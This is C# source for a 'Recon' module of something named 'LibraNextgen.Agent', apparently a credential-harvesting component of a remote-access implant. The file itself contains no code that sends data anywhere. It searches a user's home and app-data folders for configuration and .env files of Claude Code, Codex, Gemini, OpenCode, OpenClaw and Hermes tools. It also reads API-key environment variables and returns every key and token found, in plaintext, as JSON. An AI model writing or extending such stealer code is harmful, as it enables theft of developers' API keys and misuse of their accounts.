using System.Text.Json;

namespace LibraNextgen.Agent.Modules.Recon;

public static class AITokenScanner
{
    public static string Scan()
    {
        try
        {
            var entries = new List<AIScannerEntry>();
            var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            entries.AddRange(ScanClaudeCode(home));
            entries.AddRange(ScanOpenCode(home, localAppData));
            entries.AddRange(ScanCodeX(home));
            entries.AddRange(ScanGemini(home, appData));
            entries.AddRange(ScanOpenClaw(home));
            entries.AddRange(ScanHermesAgent(home));

            var deduped = entries
                .GroupBy(e => (e.Vendor, e.KeyHash))
                .Select(g => g.First())
                .ToList();

            var items = deduped.Select(e =>
            {
                return $$"""{"vendor":"{{Esc(e.Vendor)}}","source":"{{Esc(e.Source)}}","path":"{{Esc(e.Path)}}","keyName":"{{Esc(e.KeyName)}}","keyValue":"{{Esc(e.KeyValue)}}"}""";
            }).ToList();

            return $$"""{"total":{{items.Count}},"items":[{{string.Join(",", items)}}]}""";
        }
        catch (Exception ex)
        {
            return $$"""{"total":0,"items":[],"error":"{{Esc(ex.Message)}}""";
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Claude Code  —  ~/.claude/settings.json
    // ════════════════════════════════════════════════════════════════════════

    private static List<AIScannerEntry> ScanClaudeCode(string home)
    {
        var entries = new List<AIScannerEntry>();

        var cfg = Path.Combine(home, ".claude", "settings.json");
        if (File.Exists(cfg))
        {
            try
            {
                var json = File.ReadAllText(cfg);
                ExtractJsonEnvBlock(json, cfg, "ClaudeCode", entries);
            }
            catch { }
        }

        CheckEnv("ANTHROPIC_API_KEY", "ClaudeCode", entries);
        CheckEnv("CLAUDE_API_KEY", "ClaudeCode", entries);

        return entries;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  OpenCode  —  ~/.config/opencode/opencode.json  +  auth.json
    // ════════════════════════════════════════════════════════════════════════

    private static List<AIScannerEntry> ScanOpenCode(string home, string localAppData)
    {
        var entries = new List<AIScannerEntry>();

        // Primary config: provider blocks with apiKey
        foreach (var path in new[] {
            Path.Combine(home, ".config", "opencode", "opencode.json"),
            Path.Combine(home, ".opencode", "config.json"),
        })
        {
            if (!File.Exists(path)) continue;
            try
            {
                var json = File.ReadAllText(path);
                ExtractJsonKeys(json, path, "OpenCode", entries);
            }
            catch { }
        }

        // Auth file (may contain plain keys)
        var authPath = Path.Combine(localAppData, "share", "opencode", "auth.json");
        if (!OperatingSystem.IsWindows())
            authPath = Path.Combine(home, ".local", "share", "opencode", "auth.json");
        if (File.Exists(authPath))
        {
            try
            {
                var json = File.ReadAllText(authPath);
                ExtractJsonKeys(json, authPath, "OpenCode", entries);
            }
            catch { }
        }

        CheckEnv("OPENAI_API_KEY", "OpenCode", entries);
        CheckEnv("ANTHROPIC_API_KEY", "OpenCode", entries);

        return entries;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  CodeX  —  ~/.codex/config.toml  +  env OPENAI_API_KEY
    // ════════════════════════════════════════════════════════════════════════

    private static List<AIScannerEntry> ScanCodeX(string home)
    {
        var entries = new List<AIScannerEntry>();

        var cfg = Path.Combine(home, ".codex", "config.toml");
        if (File.Exists(cfg))
        {
            try
            {
                var content = File.ReadAllText(cfg);
                ExtractTomlKeys(content, cfg, "CodeX", entries);
            }
            catch { }
        }

        CheckEnv("OPENAI_API_KEY", "CodeX", entries);
        CheckEnv("CODEX_API_KEY", "CodeX", entries);

        return entries;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Gemini  —  %APPDATA%/gemini/settings.json  +  ~/.gemini/.env
    // ════════════════════════════════════════════════════════════════════════

    private static List<AIScannerEntry> ScanGemini(string home, string appData)
    {
        var entries = new List<AIScannerEntry>();

        // settings.json (may have "api-key" field)
        foreach (var path in new[] {
            Path.Combine(appData, "gemini", "settings.json"),
            Path.Combine(home, ".gemini", "settings.json"),
            Path.Combine(home, ".config", "gemini", "config.json"),
        })
        {
            if (!File.Exists(path)) continue;
            try
            {
                var json = File.ReadAllText(path);
                ExtractJsonKeys(json, path, "Gemini", entries);
            }
            catch { }
        }

        // .env file
        var envPath = Path.Combine(home, ".gemini", ".env");
        if (File.Exists(envPath))
        {
            try
            {
                var content = File.ReadAllText(envPath);
                ExtractEnvTextKeys(content, envPath, "Gemini", entries);
            }
            catch { }
        }

        CheckEnv("GEMINI_API_KEY", "Gemini", entries);
        CheckEnv("GOOGLE_API_KEY", "Gemini", entries);
        CheckEnv("GOOGLE_GEMINI_BASE_URL", "Gemini", entries);

        return entries;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  OpenClaw  —  ~/.openclaw/openclaw.json  or  config/config.json
    // ════════════════════════════════════════════════════════════════════════

    private static List<AIScannerEntry> ScanOpenClaw(string home)
    {
        var entries = new List<AIScannerEntry>();

        foreach (var path in new[] {
            Path.Combine(home, ".openclaw", "openclaw.json"),
            Path.Combine(home, ".openclaw", "config", "config.json"),
        })
        {
            if (!File.Exists(path)) continue;
            try
            {
                var json = File.ReadAllText(path);
                ExtractJsonKeys(json, path, "OpenClaw", entries);
            }
            catch { }
        }

        // Auth profiles
        var authDir = Path.Combine(home, ".openclaw", "agents");
        if (Directory.Exists(authDir))
        {
            try
            {
                foreach (var agentDir in Directory.GetDirectories(authDir))
                {
                    var profilePath = Path.Combine(agentDir, "agent", "auth-profiles.json");
                    if (File.Exists(profilePath))
                    {
                        try
                        {
                            var json = File.ReadAllText(profilePath);
                            ExtractJsonKeys(json, profilePath, "OpenClaw", entries);
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        CheckEnv("OPENCLAW_API_KEY", "OpenClaw", entries);
        CheckEnv("CLAW_API_KEY", "OpenClaw", entries);
        CheckEnv("ANTHROPIC_API_KEY", "OpenClaw", entries);
        CheckEnv("OPENAI_API_KEY", "OpenClaw", entries);

        return entries;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  HermesAgent  —  ~/.hermes/.env
    // ════════════════════════════════════════════════════════════════════════

    private static List<AIScannerEntry> ScanHermesAgent(string home)
    {
        var entries = new List<AIScannerEntry>();

        var hermesDir = Path.Combine(home, ".hermes");
        if (Directory.Exists(hermesDir))
        {
            var envPath = Path.Combine(hermesDir, ".env");
            if (File.Exists(envPath))
            {
                try
                {
                    var content = File.ReadAllText(envPath);
                    ExtractEnvTextKeys(content, envPath, "HermesAgent", entries);
                }
                catch { }
            }
        }

        CheckEnv("HERMES_API_KEY", "HermesAgent", entries);
        CheckEnv("NOUS_API_KEY", "HermesAgent", entries);
        CheckEnv("OPENAI_API_KEY", "HermesAgent", entries);
        CheckEnv("ANTHROPIC_API_KEY", "HermesAgent", entries);

        return entries;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JSON helpers
    // ════════════════════════════════════════════════════════════════════════

    /// <summary>
    /// Walk a JSON tree extracting every leaf string value that looks like an API key.
    /// </summary>
    private static void ExtractJsonKeys(string json, string path, string vendor, List<AIScannerEntry> entries)
    {
        using var doc = JsonDocument.Parse(json);
        WalkJson(doc.RootElement, "", path, vendor, entries);
    }

    /// <summary>
    /// Specifically handles Claude-style settings.json where keys live under an "env" block.
    /// Also falls back to full-tree walk for other formats.
    /// </summary>
    private static void ExtractJsonEnvBlock(string json, string path, string vendor, List<AIScannerEntry> entries)
    {
        using var doc = JsonDocument.Parse(json);
        if (doc.RootElement.TryGetProperty("env", out var envBlock) && envBlock.ValueKind == JsonValueKind.Object)
        {
            WalkJson(envBlock, "env", path, vendor, entries);
        }
        // Also walk full tree to catch any other format
        WalkJson(doc.RootElement, "", path, vendor, entries);
    }

    private static void WalkJson(JsonElement element, string prefix, string path, string vendor, List<AIScannerEntry> entries)
    {
        switch (element.ValueKind)
        {
            case JsonValueKind.Object:
                foreach (var prop in element.EnumerateObject())
                {
                    var key = string.IsNullOrEmpty(prefix) ? prop.Name : $"{prefix}.{prop.Name}";
                    // Recurse into nested objects; only add leaf strings from key-name-matching fields
                    WalkJson(prop.Value, key, path, vendor, entries);
                }
                break;
            case JsonValueKind.String:
                if (IsKeyField(prefix))
                {
                    var val = element.GetString();
                    if (!string.IsNullOrEmpty(val))
                    {
                        var keyName = prefix.TrimStart('.');
                        entries.Add(MakeEntry(vendor, "config-file", path, keyName, val));
                    }
                }
                break;
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  .env / KEY=VALUE helpers
    // ════════════════════════════════════════════════════════════════════════

    private static void ExtractEnvTextKeys(string content, string path, string vendor, List<AIScannerEntry> entries)
    {
        foreach (var line in content.Split('\n'))
        {
            var trimmed = line.Trim();
            if (string.IsNullOrEmpty(trimmed) || trimmed.StartsWith('#')) continue;

            var eqIdx = trimmed.IndexOf('=');
            if (eqIdx <= 0 || eqIdx >= trimmed.Length - 1) continue;

            var key = trimmed[..eqIdx].Trim();
            var value = trimmed[(eqIdx + 1)..].Trim().Trim('"', '\'');

            if (!string.IsNullOrEmpty(value) && IsKeyField(key))
                entries.Add(MakeEntry(vendor, "config-file", path, key, value));
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TOML helpers (CodeX config.toml)
    // ════════════════════════════════════════════════════════════════════════

    private static void ExtractTomlKeys(string content, string path, string vendor, List<AIScannerEntry> entries)
    {
        foreach (var line in content.Split('\n'))
        {
            var trimmed = line.Trim();
            if (string.IsNullOrEmpty(trimmed) || trimmed.StartsWith('#') || trimmed.StartsWith('[')) continue;

            var eqIdx = trimmed.IndexOf('=');
            if (eqIdx <= 0 || eqIdx >= trimmed.Length - 1) continue;

            var key = trimmed[..eqIdx].Trim();
            var value = trimmed[(eqIdx + 1)..].Trim().Trim('"', '\'');

            if (!string.IsNullOrEmpty(value) && IsKeyField(key))
                entries.Add(MakeEntry(vendor, "config-file", path, key, value));
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Env var
    // ════════════════════════════════════════════════════════════════════════

    private static void CheckEnv(string envName, string vendor, List<AIScannerEntry> entries)
    {
        if (!IsKeyField(envName)) return;
        var value = Environment.GetEnvironmentVariable(envName);
        if (!string.IsNullOrEmpty(value))
        {
            var entry = MakeEntry(vendor, "env-var", $"%{envName}%", envName, value);
            entries.Add(entry);
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Utilities
    // ════════════════════════════════════════════════════════════════════════

    private static readonly string[] _keyPatterns =
        { "API", "APIKEY", "API_KEY", "KEY", "TOKEN", "BASEURL", "BASE", "URL", "BASE_URL" };

    private static bool IsKeyField(string name)
    {
        var upper = name.ToUpperInvariant();
        foreach (var p in _keyPatterns)
            if (upper.Contains(p, StringComparison.Ordinal))
                return true;
        return false;
    }

    private static AIScannerEntry MakeEntry(string vendor, string source, string path, string keyName, string value)
    {
        return new AIScannerEntry
        {
            Vendor = vendor,
            Source = source,
            Path = path,
            KeyName = keyName,
            KeyValue = value,
            KeyHash = SimpleHash(value)
        };
    }

    private static string SimpleHash(string input)
    {
        unchecked
        {
            int hash = 17;
            foreach (char c in input) hash = hash * 31 + c;
            return hash.ToString("x8");
        }
    }

    private static string Esc(string s)
    {
        return s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                .Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t");
    }

    private struct AIScannerEntry
    {
        public string Vendor, Source, Path, KeyName, KeyValue, KeyHash;
    }
}
